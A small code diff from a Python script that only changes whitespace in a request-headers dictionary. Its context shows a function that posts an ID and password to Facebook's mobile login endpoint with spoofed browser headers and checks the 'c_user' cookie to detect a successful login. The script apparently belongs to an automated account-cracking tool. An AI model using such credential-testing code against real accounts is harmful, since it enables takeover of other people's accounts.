@@ -1244,7 +1244,7 @@ def m6(idf,pwv):
     'Referer': 'https://m.facebook.com/',
     'DNT': '1',
     'Pragma': 'no-cache',
-    'TE': 'Trailers', }
+    'TE': 'Trailers',}
    lo = session.post("https://m.facebook.com/login/device-based/login/async/?",data=info,headers=had).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
